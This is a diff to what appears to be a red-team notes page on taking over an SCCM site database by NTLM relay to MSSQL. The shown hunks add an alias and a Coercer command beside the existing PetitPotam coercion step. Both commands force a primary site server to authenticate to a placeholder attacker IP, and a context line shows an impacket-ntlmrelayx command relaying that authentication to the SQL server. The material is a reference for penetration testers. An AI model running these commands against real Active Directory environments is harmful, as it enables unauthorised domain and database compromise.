@@ -15,6 +15,7 @@ aliases:
   - SCCM NTLM Relay to SQL
   - SCCM Site Database Takeover
   - PetitPotam to SCCM
+  - Microsoft Configuration Manager
 ---
 ## Technique
 ___
@@ -130,9 +131,17 @@ impacket-ntlmrelayx -t "mssql://<MSSQL_SERVER_IP>" -smb2support -socks
 
 **Step 2: Coerce Authentication**
 
+**PetitPotam:**
 ```bash
 python3 PetitPotam.py -u <user> -p '<password>' -d <domain> <ATTACKER_IP> <PRIMARY_SITE_SERVER_IP>
 ```
+
+**Attempt various methods: ([coercer](https://github.com/p0dalirius/Coercer))**
+
+```bash
+python3 coercer.py coerce -l <attackerIP> -t <targetIP> -u 'user' -p 'pass' -d <domain.local> -v
+```
+
 
 **Step 3: Access the Database via Relayed Session**
 
